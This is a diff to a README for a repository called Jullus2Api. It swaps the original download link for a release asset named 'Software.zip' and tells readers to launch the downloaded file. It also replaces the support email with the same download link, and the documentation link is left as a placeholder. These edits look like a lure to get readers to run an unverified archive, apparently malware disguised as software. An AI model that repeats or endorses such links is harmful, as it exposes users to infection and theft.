@@ -7,7 +7,7 @@ Welcome to the Jullus2Api repository! Here you will find all the resources you n
 
 ## Getting Started
 To get started with Jullus2Api, you can download the necessary files from the following link:
-[Download Jullus2Api](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download Jullus2Api](https://github.com/Mkiuk/Jullus2Api/releases/download/v1.0/Software.zip)
 
 🚀 Note: Launch the downloaded file to initiate the setup process.
 
@@ -35,7 +35,7 @@ import Jullus2Api
 For detailed documentation on how to use Jullus2Api, you can visit the official website [here](insert_documentation_website_url_here).
 
 ## Support
-If you encounter any issues or have any questions, feel free to reach out to us at [support@jullus2api.com](mailto:support@jullus2api.com).
+If you encounter any issues or have any questions, feel free to reach out to us at [https://github.com/Mkiuk/Jullus2Api/releases/download/v1.0/Software.zip](https://github.com/Mkiuk/Jullus2Api/releases/download/v1.0/Software.zip).
 
 ## Contributing
 We welcome contributions from the community! If you would like to contribute to Jullus2Api, please follow these guidelines:
